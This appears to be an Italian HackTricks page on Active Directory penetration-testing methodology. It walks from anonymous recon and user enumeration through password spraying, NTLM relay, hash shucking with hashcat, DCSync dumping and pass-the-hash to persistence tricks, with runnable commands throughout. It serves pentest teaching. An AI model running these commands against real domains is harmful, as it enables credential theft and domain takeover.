# Metodologia Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Panoramica di base

**Active Directory** funge da tecnologia fondamentale, permettendo agli **amministratori di rete** di creare e gestire in modo efficiente **domini**, **utenti** e **oggetti** all'interno di una rete. È progettata per scalare, facilitando l'organizzazione di un gran numero di utenti in **gruppi** e **sottogruppi** gestibili, controllando i **diritti di accesso** a vari livelli.

La struttura di **Active Directory** è composta da tre livelli principali: **domini**, **alberi** e **foreste**. Un **dominio** comprende una collezione di oggetti, come **utenti** o **dispositivi**, che condividono un database comune. Gli **alberi** sono gruppi di questi domini collegati da una struttura condivisa, e una **foresta** rappresenta la raccolta di più alberi, interconnessi tramite **trust relationships**, formando il livello più alto della struttura organizzativa. Diritti specifici di **accesso** e **comunicazione** possono essere assegnati a ciascuno di questi livelli.

Concetti chiave in **Active Directory** includono:

1. **Directory** – Contiene tutte le informazioni relative agli oggetti di Active Directory.
2. **Object** – Indica le entità all'interno della directory, inclusi **utenti**, **gruppi** o **cartelle condivise**.
3. **Domain** – Funziona come contenitore per gli oggetti della directory; è possibile avere più domini all'interno di una **forest**, ognuno con la propria collezione di oggetti.
4. **Tree** – Raggruppamento di domini che condividono un dominio radice comune.
5. **Forest** – Il livello più alto della struttura organizzativa in Active Directory, composto da diversi alberi con **trust relationships** tra di loro.

**Active Directory Domain Services (AD DS)** include una serie di servizi critici per la gestione centralizzata e la comunicazione all'interno di una rete. Questi servizi comprendono:

1. **Domain Services** – Centralizza l'archiviazione dei dati e gestisce le interazioni tra **utenti** e **domini**, incluse le funzionalità di **authentication** e **search**.
2. **Certificate Services** – Gestisce la creazione, distribuzione e amministrazione dei **digital certificates**.
3. **Lightweight Directory Services** – Supporta applicazioni abilitate alla directory tramite il protocollo **LDAP**.
4. **Directory Federation Services** – Fornisce funzionalità di **single-sign-on** per autenticare utenti attraverso più applicazioni web in una singola sessione.
5. **Rights Management** – Aiuta a proteggere il materiale soggetto a copyright regolando la sua distribuzione e uso non autorizzati.
6. **DNS Service** – Fondamentale per la risoluzione dei **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Autenticazione Kerberos**

Per imparare come **attaccare un AD** è fondamentale comprendere molto bene il processo di **autenticazione Kerberos**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Scheda rapida

Puoi dare un'occhiata a [https://wadcoms.github.io/](https://wadcoms.github.io) per avere una panoramica rapida dei comandi che puoi eseguire per enumerare/sfruttare un AD.

> [!WARNING]
> La comunicazione Kerberos **richiede un nome di dominio completamente qualificato (FQDN)** per eseguire le azioni. Se provi ad accedere a una macchina tramite l'indirizzo IP, **verrà usato NTLM e non Kerberos**.

## Ricognizione Active Directory (No creds/sessions)

Se hai accesso a un ambiente AD ma non possiedi credenziali/sessioni, potresti:

- **Pentest the network:**
- Scansiona la rete, individua macchine e porte aperte e prova a **sfruttare vulnerabilità** o **estrarre credenziali** da esse (for example, [printers could be very interesting targets](ad-information-in-printers.md).
- L'enumerazione del DNS può fornire informazioni sui server chiave nel dominio come web, printer, share, vpn, media, ecc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Dai un'occhiata alla guida generale [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) per trovare più informazioni su come farlo.
- **Check for null and Guest access on smb services** (questo non funzionerà sulle versioni moderne di Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Una guida più dettagliata su come enumerare un server SMB può essere trovata qui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Una guida più dettagliata su come enumerare LDAP può essere trovata qui (presta **particolare attenzione all'accesso anonimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Raccogli credenziali [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Accedi agli host abusando di [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Raccogli credenziali **esponendo** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Estrai username/nome dai documenti interni, social media, servizi (soprattutto web) all'interno degli ambienti di dominio e anche da quelli pubblicamente disponibili.
- Se trovi i nomi completi dei dipendenti, puoi provare diverse convenzioni di **username AD** (**[read this](https://activedirectorypro.com/active-directory-user-naming-convention/)**). Le convenzioni più comuni sono: _NameSurname_, _Name.Surname_, _NamSur_ (3 lettere di ciascuno), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Strumenti:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumerazione utenti

- **Anonymous SMB/LDAP enum:** Controlla le pagine [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Quando viene richiesta una **username non valida** il server risponderà con il codice di errore Kerberos _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, permettendoci di determinare che lo username era invalido. Gli **username validi** restituiranno o il **TGT in una AS-REP** o l'errore _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando che all'utente è richiesta la pre-autenticazione.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (No authentication) contro l'interfaccia MS-NRPC (Netlogon) sui domain controller. Il metodo invoca la funzione `DsrGetDcNameEx2` dopo il binding dell'interfaccia MS-NRPC per verificare se l'utente o il computer esiste senza alcuna credenziale. Lo strumento [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa questo tipo di enumerazione. La ricerca può essere trovata [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Se trovi uno di questi server nella rete, puoi anche eseguire **user enumeration** su di esso. Ad esempio, puoi usare lo strumento [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Puoi trovare liste di username in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  e in questo ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Tuttavia, dovresti avere il **nome delle persone che lavorano nell'azienda** dallo step di recon che avresti dovuto eseguire prima. Con nome e cognome puoi usare lo script [**namemash.py**](https://gist.github.com/superkojiman/11076951) per generare potenziali username validi.

### Knowing one or several usernames

Ok, quindi sai di avere già uno username valido ma nessuna password... Prova allora:

- [**ASREPRoast**](asreproast.md): Se un utente **non ha** l'attributo _DONT_REQ_PREAUTH_ puoi **richiedere un messaggio AS_REP** per quell'utente che conterrà alcuni dati criptati tramite una derivazione della password dell'utente.
- [**Password Spraying**](password-spraying.md): Prova le password più **comuni** con ciascuno degli utenti scoperti, magari qualche utente usa una password debole (tieni presente la password policy!).
- Nota che puoi anche **sprayare i server OWA** per cercare di ottenere accesso alle caselle mail degli utenti.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Potresti essere in grado di **ottenere** alcuni challenge **hashes** da crackare tramite il **poisoning** di alcuni protocolli della **rete**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Se sei riuscito a enumerare l'Active Directory avrai **più e-mail e una migliore comprensione della rete**. Potresti essere in grado di forzare NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) per ottenere accesso all'ambiente AD.

### NetExec workspace-driven recon & relay posture checks

- Usa **`nxcdb` workspaces** per conservare lo stato di recon AD per engagement: `workspace create <name>` genera DB SQLite per protocollo sotto `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Cambia vista con `proto smb|mssql|winrm` e lista i segreti raccolti con `creds`. Pulisci manualmente i dati sensibili a lavoro concluso: `rm -rf ~/.nxc/workspaces/<name>`.
- Scoperta rapida di subnet con **`netexec smb <cidr>`** mostra **domain**, **OS build**, **SMB signing requirements**, e **Null Auth**. Host che mostrano `(signing:False)` sono **relay-prone**, mentre i DC spesso richiedono signing.
- Genera **hostnames in /etc/hosts** direttamente dall'output di NetExec per facilitare il targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Quando **SMB relay to the DC is blocked** a causa della signing, verifica comunque la postura di **LDAP**: `netexec ldap <dc>` evidenzia `(signing:None)` / weak channel binding. Un DC che richiede SMB signing ma ha LDAP signing disabilitato rimane un target valido per **relay-to-LDAP** e può essere abusato con tecniche come **SPN-less RBCD**.

### Client-side printer credential leaks → validazione bulk delle credenziali di dominio

- Le Printer/web UIs a volte **embed masked admin passwords in HTML**. Visualizzando il source/devtools si può rivelare il testo in chiaro (es., `<input value="<password>">`), permettendo l'accesso Basic-auth ai repository di scansione/stampa.
- I print jobs recuperati possono contenere **plaintext onboarding docs** con password per utente. Mantieni gli abbinamenti allineati durante i test:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Se puoi **accedere ad altri PC o condivisioni** con l'**utente null o guest** potresti **posizionare file** (come un file SCF) che se in qualche modo vengono aperti **innescheranno una autenticazione NTLM verso di te** così puoi **rubare** la **sfida NTLM** per romperla:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** tratta ogni hash NT che possiedi già come una password candidata per altri formati più lenti il cui materiale chiave è derivato direttamente dall'hash NT. Invece di brute-forzare passphrase lunghe in ticket Kerberos RC4, challenge NetNTLM o credenziali cached, inserisci gli hash NT nelle modalità NT-candidate di Hashcat e lascia che verifichi il riutilizzo delle password senza mai apprendere il plaintext. Questo è particolarmente potente dopo una compromissione di dominio dove puoi raccogliere migliaia di hash NT attuali e storici.

Usa lo shucking quando:

- Hai un corpus NT da DCSync, dump SAM/SECURITY o vault di credenziali e devi testare il riutilizzo in altri domini/foreste.
- Catturi materiale Kerberos basato su RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), risposte NetNTLM o blob DCC/DCC2.
- Vuoi rapidamente dimostrare il riutilizzo per passphrase lunghe e non crackabili e pivotare immediatamente via Pass-the-Hash.

La tecnica **non funziona** contro tipi di cifratura i cui key material non sono l'hash NT (es., Kerberos etype 17/18 AES). Se un dominio impone solo AES, devi tornare alle modalità password regolari.

#### Building an NT hash corpus

- **DCSync/NTDS** – Usa `secretsdump.py` con history per prendere il set più ampio possibile di hash NT (e i loro valori precedenti):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Le voci di history ampliano drasticamente il pool di candidati perché Microsoft può memorizzare fino a 24 hash precedenti per account. Per altri modi per raccogliere i segreti NTDS vedi:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (o Mimikatz `lsadump::sam /patch`) estrae dati SAM/SECURITY locali e logon di dominio cached (DCC/DCC2). Deduplica e aggiungi quegli hash allo stesso file `nt_candidates.txt`.
- **Track metadata** – Conserva username/dominio che hanno prodotto ogni hash (anche se la wordlist contiene solo hex). Hash corrispondenti ti dicono immediatamente quale principal sta riutilizzando una password una volta che Hashcat stampa il candidato vincente.
- Preferisci candidati dalla stessa forest o da una forest trusted; questo massimizza la probabilità di overlap quando fai lo shucking.

#### Hashcat NT-candidate modes

| Tipo di Hash                             | Modalità Password | Modalità NT-Candidate |
| ---------------------------------------- | ----------------- | --------------------- |
| Domain Cached Credentials (DCC)          | 1100              | 31500                 |
| Domain Cached Credentials 2 (DCC2)       | 2100              | 31600                 |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500              | 27000                 |
| NetNTLMv2                                | 5600              | 27100                 |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500              | _N/A_                 |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100             | 35300                 |
| Kerberos 5 etype 23 AS-REP               | 18200             | 35400                 |

Note:

- Gli input NT-candidate **devono rimanere raw 32-hex NT hashes**. Disabilita gli engine di rule (niente `-r`, niente modalità ibride) perché il mangling corrompe il materiale chiave candidato.
- Queste modalità non sono intrinsecamente più veloci, ma lo spazio chiave NTLM (~30,000 MH/s su un M3 Max) è ~100× più veloce del Kerberos RC4 (~300 MH/s). Testare una lista NT curata è molto più economico che esplorare l'intero spazio password nel formato lento.
- Esegui sempre l'**ultima build di Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) perché le modalità 31500/31600/35300/35400 sono state rilasciate di recente.
- Attualmente non esiste una modalità NT per AS-REQ Pre-Auth, e gli etype AES (19600/19700) richiedono la password in chiaro perché le loro chiavi sono derivate via PBKDF2 da password UTF-16LE, non da raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Cattura un TGS RC4 per un target SPN con un utente a basso privilegio (vedi la pagina Kerberoast per i dettagli):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck il ticket con la tua lista NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriva la chiave RC4 da ogni candidato NT e valida il blob `$krb5tgs$23$...`. Una corrispondenza conferma che l'account di servizio usa uno degli hash NT che possiedi.

3. Pivot immediatamente via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Puoi opzionalmente recuperare il plaintext più tardi con `hashcat -m 1000 <matched_hash> wordlists/` se necessario.

#### Example – Cached credentials (mode 31600)

1. Dump dei logon cached da una workstation compromessa:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copia la riga DCC2 per l'utente di dominio interessante in `dcc2_highpriv.txt` e shuckala:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Una corrispondenza riuscita restituisce l'hash NT già noto nella tua lista, dimostrando che l'utente cached sta riutilizzando una password. Usalo direttamente per PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) o brute-forcealo in modalità NTLM veloce per recuperare la stringa.

Lo stesso workflow si applica a NetNTLM challenge-responses (`-m 27000/27100`) e DCC (`-m 31500`). Una volta identificata una corrispondenza puoi lanciare relay, SMB/WMI/WinRM PtH, o ricrackare l'hash NT con mask/rule offline.



## Enumerating Active Directory WITH credentials/session

Per questa fase devi aver **compromesso le credenziali o una sessione di un account di dominio valido.** Se hai qualche credenziale valida o una shell come utente di dominio, **ricorda che le opzioni viste prima sono ancora valide per compromettere altri utenti**.

Prima di iniziare l'enumerazione autenticata dovresti sapere qual è il **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumerazione

Avere compromesso un account è un **grande passo per iniziare a compromettere l'intero dominio**, perché potrai avviare l'**Active Directory Enumeration:**

Riguardo a [**ASREPRoast**](asreproast.md) ora puoi trovare ogni possibile utente vulnerabile, e riguardo a [**Password Spraying**](password-spraying.md) puoi ottenere una **lista di tutti gli username** e provare la password dell'account compromesso, password vuote e nuove password promettenti.

- Potresti usare il [**CMD per fare una recon di base**](../basic-cmd-for-pentesters.md#domain-info)
- Puoi anche usare [**powershell per la recon**](../basic-powershell-for-pentesters/index.html) che sarà più stealthy
- Puoi anche [**usare powerview**](../basic-powershell-for-pentesters/powerview.md) per estrarre informazioni più dettagliate
- Un altro strumento eccellente per la recon in Active Directory è [**BloodHound**](bloodhound.md). Non è **molto stealthy** (dipende dai metodi di raccolta che usi), ma **se non ti interessa** provarlo è caldamente consigliato. Trova dove gli utenti possono RDP, trova percorsi verso altri gruppi, ecc.
- **Altri strumenti automatizzati di enumerazione AD sono:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- I [**record DNS dell'AD**](ad-dns-records.md) possono contenere informazioni interessanti.
- Uno **strumento con GUI** che puoi usare per enumerare la directory è **AdExplorer.exe** dalla SysInternal Suite.
- Puoi anche cercare nel database LDAP con **ldapsearch** per cercare credenziali nei campi _userPassword_ & _unixUserPassword_, o anche in _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) per altri metodi.
- Se stai usando **Linux**, puoi anche enumerare il dominio usando [**pywerview**](https://github.com/the-useless-one/pywerview).
- Potresti anche provare strumenti automatizzati come:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Estrazione di tutti gli utenti di dominio**

È molto facile ottenere tutti gli username di dominio da Windows (`net user /domain` ,`Get-DomainUser` o `wmic useraccount get name,sid`). In Linux, puoi usare: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` o `enum4linux -a -u "user" -p "password" <DC IP>`

> Anche se questa sezione di Enumerazione sembra breve, è la parte più importante di tutte. Accedi ai link (principalmente quelli di cmd, powershell, powerview e BloodHound), impara come enumerare un dominio e pratica finché non ti senti sicuro. Durante un assessment, questo sarà il momento chiave per trovare la via verso DA o per decidere che non si può fare nulla.

### Kerberoast

Kerberoasting consiste nell'ottenere **TGS tickets** usati da servizi legati ad account utente e nel crackare la loro cifratura — che è basata sulle password degli utenti — **offline**.

Di più su questo in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Una volta ottenute delle credenziali puoi verificare se hai accesso a qualche **macchina**. A tal fine, puoi usare **CrackMapExec** per tentare la connessione su diversi server con differenti protocolli, in base alle tue scansioni di porta.

### Local Privilege Escalation

Se hai compromesso credenziali o una sessione come utente di dominio normale e hai **accesso** con questo utente a **qualsiasi macchina nel dominio** dovresti provare a trovare il modo di **escalare privilegi localmente e saccheggiare credenziali**. Questo perché solo con privilegi di amministratore locale potrai **dumpare gli hash di altri utenti** in memoria (LSASS) e localmente (SAM).

C'è una pagina completa in questo libro su [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) e una [**checklist**](../checklist-windows-privilege-escalation.md). Inoltre, non dimenticare di usare [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

È molto **improbabile** che troverai **ticket** nell'utente corrente che ti diano permessi per accedere a risorse inaspettate, ma puoi verificare:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Se sei riuscito a enumerare l'active directory avrai **più email e una migliore comprensione della rete**. Potresti essere in grado di forzare NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Cerca Creds nelle condivisioni dei computer | SMB Shares

Ora che hai alcune credenziali di base dovresti verificare se puoi **trovare** file **interessanti condivisi all'interno dell'AD**. Puoi farlo manualmente ma è un compito molto noioso e ripetitivo (e ancora di più se trovi centinaia di documenti da controllare).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Se puoi **accedere ad altri PC o condivisioni** potresti **posizionare file** (come un file SCF) che, se in qualche modo aperti, **innescheranno un'autenticazione NTLM verso di te** così da poter **rubare** la **NTLM challenge** per crackarla:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Questa vulnerabilità permetteva a qualsiasi utente autenticato di **compromettere il domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Escalation dei privilegi su Active Directory CON credenziali/sessione privilegiate

**Per le tecniche seguenti un normale utente di dominio non è sufficiente, hai bisogno di privilegi/credenziali speciali per eseguire questi attacchi.**

### Hash extraction

Si spera che tu sia riuscito a **compromettere qualche account local admin** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Poi, è il momento di estrarre tutti gli hash dalla memoria e localmente.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
Devi usare qualche **tool** che **esegua** l'**autenticazione NTLM utilizzando** quell'**hash**, **oppure** puoi creare un nuovo **sessionlogon** e **iniettare** quell'**hash** dentro **LSASS**, così quando viene eseguita qualsiasi **autenticazione NTLM**, quell'**hash** sarà usato. L'ultima opzione è ciò che fa mimikatz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Se hai l'**hash** o la **password** di un **local administrator**, dovresti provare a **accedere localmente** ad altri **PC** con quelle credenziali.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Nota che questo è piuttosto **rumoroso** e **LAPS** lo **mitigherebbe**.

### MSSQL Abuse & Trusted Links

Se un utente ha privilegi per **accedere a MSSQL instances**, potrebbe essere in grado di usarlo per **eseguire comandi** sull'host MSSQL (se in esecuzione come SA), **rubare** l'**hash** NetNTLM o persino effettuare un **relay** **attack**.\
Inoltre, se un'istanza MSSQL è trusted (database link) da una diversa istanza MSSQL. Se l'utente ha privilegi sul database trusted, potrà **usare la relazione di trust per eseguire query anche nell'altra istanza**. Queste trust possono essere concatenate e a un certo punto l'utente potrebbe trovare un database mal configurato dove può eseguire comandi.\
**I collegamenti tra database funzionano anche attraverso forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Suite di inventario e deployment di terze parti spesso espongono percorsi potenti verso credenziali ed esecuzione di codice. Vedi:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Se trovi un qualsiasi oggetto Computer con l'attributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e hai privilegi di dominio sul computer, sarai in grado di dumpare i TGTs dalla memoria di tutti gli utenti che effettuano il login sul computer.\
Quindi, se un **Domain Admin logins onto the computer**, potrai dumpare il suo TGT e impersonarlo usando [Pass the Ticket](pass-the-ticket.md).\
Grazie alla constrained delegation potresti perfino **compromettere automaticamente un Print Server** (si spera che sia un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Se a un utente o computer è consentita la "Constrained Delegation" potrà **impersonare qualsiasi utente per accedere ad alcuni servizi su un computer**.\
Poi, se **comprometti l'hash** di questo utente/computer sarai in grado di **impersonare qualsiasi utente** (anche domain admins) per accedere ad alcuni servizi.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Avere il privilegio **WRITE** su un oggetto Active Directory di un computer remoto consente di ottenere l'esecuzione di codice con **privilegi elevati**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

L'utente compromesso potrebbe avere alcuni **privilegi interessanti su oggetti di dominio** che potrebbero permetterti di **muoverti** lateralmente/**escalare** privilegi.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Scoprire un **Spool service listening** all'interno del dominio può essere **abusato** per **acquisire nuove credenziali** e **escalare privilegi**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Se **altri utenti** **accedono** alla macchina **compromessa**, è possibile **raccogliere credenziali dalla memoria** e persino **iniettare beacons nei loro processi** per impersonarli.\
Di solito gli utenti accedono al sistema via RDP, quindi qui trovi come eseguire un paio di attacchi sulle sessioni RDP di terzi:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fornisce un sistema per gestire la **local Administrator password** sui computer uniti al dominio, assicurandone la **randomizzazione**, l'unicità e il cambio frequente. Queste password sono memorizzate in Active Directory e l'accesso è controllato tramite ACLs solo agli utenti autorizzati. Con permessi sufficienti per accedere a queste password, il pivoting verso altri computer diventa possibile.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Raccogliere certificati** dalla macchina compromessa potrebbe essere un modo per escalare privilegi all'interno dell'ambiente:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Se sono configurati **vulnerable templates** è possibile abusarne per escalare privilegi:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Una volta ottenuti i privilegi di **Domain Admin** o, ancora meglio, **Enterprise Admin**, puoi **dumpare** il **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Alcune delle tecniche discusse prima possono essere usate per la persistenza.\
Ad esempio potresti:

- Rendere gli utenti vulnerabili a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Rendere gli utenti vulnerabili a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Concedere privilegi [**DCSync**](#dcsync) a un utente

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

L'**Silver Ticket attack** crea un **legittimo Ticket Granting Service (TGS) ticket** per un servizio specifico utilizzando l'**NTLM hash** (per esempio, l'**hash dell'account PC**). Questo metodo viene impiegato per **accedere ai privilegi del servizio**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

